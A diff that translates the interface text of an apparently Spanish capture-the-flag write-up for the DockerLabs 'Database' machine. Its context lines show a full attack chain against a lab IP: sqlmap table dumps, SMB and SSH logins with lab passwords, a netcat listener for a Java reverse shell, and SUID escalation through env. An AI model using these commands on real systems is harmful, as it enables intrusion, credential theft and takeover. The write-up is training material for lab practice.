@@ -103,7 +103,7 @@
     .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
     .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
     .badge-easy   { color: var(--green);  border-color: rgba(0,255,136,0.4);  background: rgba(0,255,136,0.05); }
-    .badge-medium { color: var(--orange); border-color: rgba(255,140,0,0.4);  background: rgba(255,140,0,0.05); }
+    .badge-medio { color: var(--orange); border-color: rgba(255,140,0,0.4);  background: rgba(255,140,0,0.05); }
     .badge-docker { color: var(--cyan);   border-color: rgba(0,229,255,0.3);  background: rgba(0,229,255,0.05); }
     .badge-linux  { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
     .badge-sqli   { color: var(--red);    border-color: rgba(255,45,85,0.3);  background: rgba(255,45,85,0.05); }
@@ -136,7 +136,7 @@
     .val-yellow { color: var(--yellow); }
     .val-red    { color: var(--red); }
 
-    /* ATTACK PATH */
+    /* RUTA DE ATAQUE */
     .attack-path { display: flex; flex-direction: column; gap: 0; }
     .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
     .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
@@ -291,29 +291,30 @@
 <div class="cursor-ring" id="cursorRing"></div>
 
 <nav>
-  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
-  <a href="https://brandeiks.github.io/writeups/" class="nav-back">volver al portafolio</a>
-</nav>
+    <a href="../../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+    <a href="../../../writeups/index.html" class="nav-back">ANÁLISIS</a>
+    <a href="../../../diccionario/index.html" class="nav-back">DICCIONARIO</a>
+  </nav>
 
 <!-- HERO -->
 <div class="writeup-hero">
   <div class="hero-grid"></div>
   <div class="hero-glow"></div>
   <div class="writeup-hero-content">
-    <p class="breadcrumb">
-      <a href="https://brandeiks.github.io/">brandeiks</a> /
-      <a href="https://brandeiks.github.io/writeups/">writeups</a> /
-      <a href="https://brandeiks.github.io/writeups/">dockerlabs</a> /
+    <div class="breadcrumb">
+      <a href="../../../index.html">brandeiks</a> /
+      <a href="../../../writeups/index.html">análisis</a> /
+      <a href="../../../writeups/index.html">dockerlabs</a> /
       <span>database</span>
-    </p>
+    </div>
     <h1 class="writeup-title"><span>Database</span></h1>
-    <p class="writeup-subtitle">DockerLabs — Linux · SQLi → SMB → Java Reverse Shell → SUID env</p>
+    <p class="writeup-subtitle">DockerLabs — Linux · SQLi → SMB → Reverse shell en Java → SUID env</p>
     <div class="writeup-meta">
-      <span class="meta-badge badge-medium">● MEDIO</span>
+      <span class="meta-badge badge-medio">● MEDIO</span>
       <span class="meta-badge badge-docker">DOCKERLABS</span>
       <span class="meta-badge badge-linux">LINUX</span>
       <span class="meta-badge badge-sqli">SQL INJECTION</span>
-      <span class="meta-date">📅 Abril 2026 · By Brandeiks</span>
+      <span class="meta-date">📅 Abril 2026 · Por Brandeiks</span>
     </div>
   </div>
 </div>
@@ -332,7 +333,7 @@
         <li><a href="#sqlmap">04 · Explotación SQLi</a></li>
         <li><a href="#smb">05 · Enumeración SMB</a></li>
         <li><a href="#acceso">06 · Acceso Inicial (SSH)</a></li>
-        <li><a href="#privesc">07 · Escalada de Privilegios</a></li>
+        <li><a href="#privesc">07 · Escalada de privilegios</a></li>
         <li><a href="#root">08 · Root</a></li>
         <li><a href="#referencia">09 · Referencia de Comandos</a></li>
       </ul>
@@ -342,11 +343,11 @@
       <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-cyan">DockerLabs</span></div>
       <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
       <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-yellow">Medio</span></div>
-      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
+      <div class="info-row"><span class="info-label">IP objetivo</span><span class="info-val" style="color:var(--text)">172.17.0.2</span></div>
       <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
     </div>
     <div class="sidebar-box">
-      <p class="sidebar-title">// ATTACK PATH</p>
+      <p class="sidebar-title">// RUTA DE ATAQUE</p>
       <div class="attack-path">
         <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Nmap</span> → puertos 22, 80, 139, 445</div></div>
         <div class="ap-line"></div>
@@ -430,7 +431,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo bash auto_deploy.sh database.tar">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">DEPLOY</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo bash <span class="arg">auto_deploy.sh</span> <span class="arg">database.tar</span></span></div>
       </div>
@@ -461,7 +462,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo nmap -p- -sSCV -n -Pn --min-rate=5000 --open 172.17.0.2">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sudo nmap <span class="flag">-p-</span> <span class="flag">-sSCV</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="flag">--open</span> <span class="arg">172.17.0.2</span></span></div>
       </div>
@@ -527,7 +528,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="POST /index.php HTTP/1.1&#10;Host: 172.17.0.2&#10;Content-Type: application/x-www-form-urlencoded&#10;&#10;name=admin&password=admin&submit=">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">BURP · CONTENIDO DE request.txt</span>
         <div><span class="cmd">POST /index.php HTTP/1.1</span></div>
         <div><span class="cmd">Host: 172.17.0.2</span></div>
@@ -548,7 +549,7 @@
     <!-- SQLMAP -->
     <div class="section" id="sqlmap">
       <p class="section-label">// 04</p>
-      <h2 class="section-title">Explotación — SQL Injection</h2>
+      <h2 class="section-title">Explotación — Inyección SQL</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -571,7 +572,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span></span></div>
       </div>
@@ -598,7 +599,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt --dbs">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">--dbs</span></span></div>
       </div>
@@ -626,7 +627,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt -D register --tables">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">register</span> <span class="flag">--tables</span></span></div>
       </div>
@@ -654,7 +655,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sqlmap -r request.txt -D register -T users --dump">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SQLMAP</span>
         <div><span class="prompt">$ </span><span class="cmd">sqlmap <span class="flag">-r</span> <span class="arg">request.txt</span> <span class="flag">-D</span> <span class="arg">register</span> <span class="flag">-T</span> <span class="arg">users</span> <span class="flag">--dump</span></span></div>
       </div>
@@ -698,7 +699,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="smbclient -L //172.17.0.2/ -N">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SMBCLIENT</span>
         <div><span class="prompt">$ </span><span class="cmd">smbclient <span class="flag">-L</span> <span class="arg">//172.17.0.2/</span> <span class="flag">-N</span></span></div>
       </div>
@@ -725,7 +726,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="smbclient //172.17.0.2/shared -U dylan">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SMBCLIENT</span>
         <div><span class="prompt">$ </span><span class="cmd">smbclient <span class="arg">//172.17.0.2/shared</span> <span class="flag">-U</span> <span class="arg">dylan</span></span></div>
         <div><span class="cmd">Password: KJSDFG789FGSDF78</span></div>
@@ -802,7 +803,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="ssh augustus@172.17.0.2">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH</span>
         <div><span class="prompt">$ </span><span class="cmd">ssh <span class="arg">augustus@172.17.0.2</span></span></div>
         <div><span class="cmd">augustus@172.17.0.2's password: lovely</span></div>
@@ -826,7 +827,7 @@
     <!-- PRIVESC -->
     <div class="section" id="privesc">
       <p class="section-label">// 07</p>
-      <h2 class="section-title">Escalada de Privilegios — dylan</h2>
+      <h2 class="section-title">Escalada de privilegios — dylan</h2>
       <div class="section-line"></div>
 
       <div class="step-marker">
@@ -856,7 +857,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="nc -lvnp 9001">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">NETCAT</span>
         <div><span class="prompt">$ </span><span class="cmd">nc <span class="flag">-lvnp</span> <span class="arg">9001</span></span></div>
       </div>
@@ -880,7 +881,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="cd /tmp && nano shell.java">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SSH — AUGUSTUS</span>
         <div><span class="prompt">augustus@...:~$ </span><span class="cmd">cd /tmp</span></div>
         <div><span class="prompt">augustus@...:/tmp$ </span><span class="cmd">nano shell.java</span></div>
@@ -898,7 +899,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="javac shell.java">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">JAVAC</span>
         <div><span class="prompt">augustus@...:/tmp$ </span><span class="cmd">javac <span class="arg">shell.java</span></span></div>
       </div>
@@ -922,7 +923,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="sudo -u dylan /usr/bin/java -cp /tmp shell">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">SUDO — JAVA</span>
         <div><span class="prompt">augustus@...:/tmp$ </span><span class="cmd">sudo <span class="flag">-u</span> <span class="arg">dylan</span> /usr/bin/java <span class="flag">-cp</span> <span class="arg">/tmp</span> shell</span></div>
       </div>
@@ -947,7 +948,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="find / -perm -4000 2>/dev/null">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">FIND SUID</span>
         <div><span class="prompt">dylan@...:/tmp$ </span><span class="cmd">find / <span class="flag">-perm -4000</span> <span class="arg">2&gt;/dev/null</span></span></div>
       </div>
@@ -1000,7 +1001,7 @@
       </div>
 
       <div class="cmd-block" data-cmd="/usr/bin/env /bin/sh -p">
-        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <button class="copy-btn" onclick="copyCmd(this)">COPIAR</button>
         <span class="cmd-label">PRIVESC → ROOT</span>
         <div><span class="prompt">dylan@...:/tmp$ </span><span class="cmd">/usr/bin/env /bin/sh <span class="flag">-p</span></span></div>
         <div><span class="prompt"># </span><span class="cmd">whoami</span></div>
@@ -1138,9 +1139,9 @@
 
 <!-- FOOTER -->
 <footer>
-  <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Writeup personal · DockerLabs</p>
-  <p>Built with <span>kali linux</span> &amp; <span>❤</span></p>
-</footer>
+    <p>© 2026 <span>Brandon Zevallos Pastrana</span> — Análisis de Database · DockerLabs</p>
+    <p>Hecho con <span>kali linux</span> &amp; <span>❤</span></p>
+  </footer>
 
 <script>
   // ACTIVE TOC
